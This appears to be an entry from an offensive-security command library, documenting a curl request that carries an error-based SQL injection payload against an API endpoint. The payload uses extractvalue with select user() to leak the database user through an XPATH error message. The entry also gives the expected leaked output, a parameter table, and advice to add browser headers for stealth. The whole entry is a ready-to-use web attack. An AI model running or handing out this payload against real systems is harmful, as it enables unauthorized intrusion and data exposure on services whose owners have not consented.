---
id: cmd-uuid-001
name: curl-leak-user
type: command
executor: bash
data: >-
  curl -X GET
  "https://target.com/api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+user()))))=1--%20aa"
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  -H "Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
  -H "Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3" -H "Accept-Encoding:
  gzip, deflate" -H "Upgrade-Insecure-Requests: 1" --compressed
output: >-
  HTTP/1.1 500 Internal Server Error with message: 'Invalid `prisma.queryRaw()`
  invocation: Raw query failed. Code: `1105`. Message: `XPATH syntax error:
  ':user@host@domain'`'
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.490Z'
platforms:
  - Linux
  - Web
tags:
  - sqli
  - curl
verified: false
validated: true
submitted: true
---

# curl-leak-user

## Command

```bash
curl -X GET "https://target.com/api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+user()))))=1--%20aa" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" -H "Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3" -H "Accept-Encoding: gzip, deflate" -H "Upgrade-Insecure-Requests: 1" --compressed
```

## Description

Sends an HTTP GET request with SQL injection payload to leak the database user via error message.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | HTTP method | Yes |
| URL path | Target endpoint with payload | Yes |
| `-H` headers | Mimic browser request | Yes |
| `--compressed` | Handle gzip | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://target.com/api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+user()))))=1--%20aa"
```

### Advanced Usage

Add full headers as above for stealth.

## Expected Output

500 error with XPATH syntax error leaking user, e.g., ':user@host@domain'.

## Related

- [[Related Procedure: Leak-Database-User-via-SQL-Injection]]
